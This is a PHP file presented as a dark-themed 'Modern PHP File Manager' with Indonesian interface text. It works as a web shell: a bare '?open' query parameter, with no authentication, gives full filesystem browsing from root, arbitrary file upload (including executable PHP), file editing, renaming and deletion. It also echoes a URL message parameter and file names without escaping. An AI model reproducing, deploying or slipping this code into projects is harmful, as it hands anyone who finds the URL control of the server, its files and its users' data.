<?php
/****************************
 * Modern PHP File Manager (Require ?open + True Dark Mode)
 ****************************/

// === Require query ?open ===
if (!isset($_GET['open'])) {
    http_response_code(403);
    exit("Access blocked");
}

$BASE_START = __DIR__;

function safe_real($p){
    $r = realpath($p);
    return $r !== false ? $r : null;
}

$cwd = isset($_GET['p']) ? $_GET['p'] : $BASE_START;
$cwd = safe_real($cwd) ?: $BASE_START;

$msg = "";

// ===== Actions =====
if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['action'])) {
    $a = $_POST['action'];

    if ($a==='upload' && isset($_FILES['file'])) {
        move_uploaded_file($_FILES['file']['tmp_name'], $cwd.'/'.basename($_FILES['file']['name']));
        $msg="Upload sukses";
    }

    if ($a==='mkdir' && !empty($_POST['folder'])) {
        @mkdir($cwd.'/'.basename($_POST['folder']));
        $msg="Folder dibuat";
    }

    if ($a==='mkfile' && !empty($_POST['filename'])) {
        $f=$cwd.'/'.basename($_POST['filename']);
        if(!file_exists($f)) file_put_contents($f,"");
        $msg="File dibuat";
    }

    if ($a==='rename') {
        $old=safe_real($cwd.'/'.$_POST['old']);
        $new=$cwd.'/'.basename($_POST['new']);
        if($old) @rename($old,$new);
        $msg="Rename berhasil";
    }

    if ($a==='delete') {
        $t=safe_real($cwd.'/'.$_POST['target']);
        if($t){ is_dir($t)?@rmdir($t):@unlink($t); }
        $msg="Terhapus";
    }

    if ($a==='save') {
        $f=safe_real($cwd.'/'.$_POST['file']);
        if($f && is_file($f)) file_put_contents($f,$_POST['content']);
        $msg="Disimpan";
    }

    header("Location: ?open&p=".urlencode($cwd)."&msg=".urlencode($msg));
    exit;
}

$editFile=null;
if(isset($_GET['edit'])){
    $ep=safe_real($cwd.'/'.$_GET['edit']);
    if($ep && is_file($ep)) $editFile=$ep;
}

$items=scandir($cwd);

function breadcrumb($path){
    $parts=explode('/',trim($path,'/'));
    $acc=''; $links=[];
    foreach($parts as $p){
        if($p==='') continue;
        $acc.='/'.$p;
        $links[]=['name'=>$p,'path'=>$acc];
    }
    return $links;
}
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>File Manager</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
<style>
/* ===== TRUE DARK THEME ===== */
:root{
 --bg:#0b0e14;
 --card:#121720;
 --card2:#171d29;
 --text:#e5e9ff;
 --muted:#9aa0b5;
 --border:#2a3142;
 --tbl:#1b2230;
}
body{background:var(--bg);color:var(--text);}
.card-modern{
 border-radius:18px;
 background:var(--card);
 border:1px solid var(--border);
}
.table{color:var(--text);}
.table thead{background:var(--tbl);}
.table tbody tr{background:var(--card2);}
.table tbody tr+tr{border-top:1px solid #222b3a;}
.badge-folder{background:#1f2f55;color:#9fc0ff}
.badge-file{background:#2a2f3a;color:#cfd5e5}
input,textarea{background:#0f141e!important;color:#e5e9ff!important;border:1px solid #2c3446!important}
.btn-outline-secondary{border-color:#3b455a!important}
a{color:#9fc0ff}
a:hover{color:#bcd5ff}
textarea{font-family:monospace}
</style>
</head>
<body>
<div class="container py-4">

  <div class="mb-3">
    <h3 class="fw-semibold mb-1">File Manager</h3>
    <span class="text-secondary">Dark • Minimal • Clean</span>
  </div>

  <?php if(isset($_GET['msg'])): ?>
  <div class="alert alert-success card-modern shadow-sm mb-3"><?=$_GET['msg']?></div>
  <?php endif; ?>

  <!-- Breadcrumb -->
  <div class="card card-modern shadow-sm mb-4">
    <div class="card-body d-flex flex-wrap justify-content-between align-items-center gap-2">
      <div>
        <strong class="text-secondary">Path</strong> :
        <a href="?open&p=/">/</a>
        <?php foreach(breadcrumb($cwd) as $b): ?>
          / <a href="?open&p=<?=urlencode($b['path'])?>"><?=$b['name']?></a>
        <?php endforeach; ?>
      </div>

      <div class="d-flex flex-wrap gap-2">
        <form method="post" enctype="multipart/form-data" class="d-flex gap-2">
          <input type="hidden" name="action" value="upload">
          <input type="file" name="file" class="form-control form-control-sm" required>
          <button class="btn btn-primary btn-sm px-3">Upload</button>
        </form>

        <form method="post" class="d-flex gap-2">
          <input type="hidden" name="action" value="mkdir">
          <input type="text" name="folder" placeholder="New folder" class="form-control form-control-sm">
          <button class="btn btn-success btn-sm">Create Folder</button>
        </form>

        <form method="post" class="d-flex gap-2">
          <input type="hidden" name="action" value="mkfile">
          <input type="text" name="filename" placeholder="New file" class="form-control form-control-sm">
          <button class="btn btn-info btn-sm">Create File</button>
        </form>
      </div>
    </div>
  </div>

  <?php if($editFile): ?>
  <div class="card card-modern shadow-sm mb-4">
    <div class="card-header bg-transparent fw-semibold">
      Edit — <?=basename($editFile)?>
    </div>
    <div class="card-body">
      <form method="post">
        <input type="hidden" name="action" value="save">
        <input type="hidden" name="file" value="<?=htmlspecialchars($_GET['edit'])?>">
        <textarea rows="12" name="content" class="form-control mb-3"><?=htmlspecialchars(file_get_contents($editFile))?></textarea>
        <div class="d-flex gap-2">
          <button class="btn btn-primary px-3">Simpan</button>
          <a href="?open&p=<?=urlencode($cwd)?>" class="btn btn-outline-secondary">Batal</a>
        </div>
      </form>
    </div>
  </div>
  <?php endif; ?>

  <div class="card card-modern shadow-sm">
    <div class="table-responsive">
      <table class="table mb-0">
        <thead>
          <tr>
            <th>Nama</th><th>Tipe</th><th>Ukuran</th><th class="text-end">Aksi</th>
          </tr>
        </thead>
        <tbody>
        <?php foreach($items as $it):
          if($it==='.') continue;
          $full=safe_real($cwd.'/'.$it);
          if(!$full) continue;
          $isDir=is_dir($full);
        ?>
        <tr>
          <td class="fw-medium">
            <?php if($isDir): ?>
              <span class="badge badge-folder me-1">Folder</span>
              <a href="?open&p=<?=urlencode($full)?>"><?=$it?></a>
            <?php else: ?>
              <span class="badge badge-file me-1">File</span>
              <?=$it?>
            <?php endif; ?>
          </td>
          <td><?=$isDir?'Folder':'File'?></td>
          <td><?=$isDir?'—':filesize($full).' bytes'?></td>
          <td class="text-end">
            <?php if(!$isDir): ?>
              <a class="btn btn-sm btn-outline-primary"
                 href="?open&p=<?=urlencode($cwd)?>&edit=<?=urlencode($it)?>">Edit</a>
            <?php endif; ?>

            <form method="post" class="d-inline" onsubmit="return confirm('Hapus item ini?')">
              <input type="hidden" name="action" value="delete">
              <input type="hidden" name="target" value="<?=htmlspecialchars($it)?>">
              <button class="btn btn-sm btn-outline-danger">Delete</button>
            </form>

            <form method="post" class="d-inline">
              <input type="hidden" name="action" value="rename">
              <input type="hidden" name="old" value="<?=htmlspecialchars($it)?>">
              <input type="text" name="new" class="form-control form-control-sm d-inline" placeholder="rename">
              <button class="btn btn-sm btn-outline-secondary">OK</button>
            </form>
          </td>
        </tr>
        <?php endforeach;?>
        </tbody>
      </table>
    </div>
  </div>

</div>
</body>
</html>
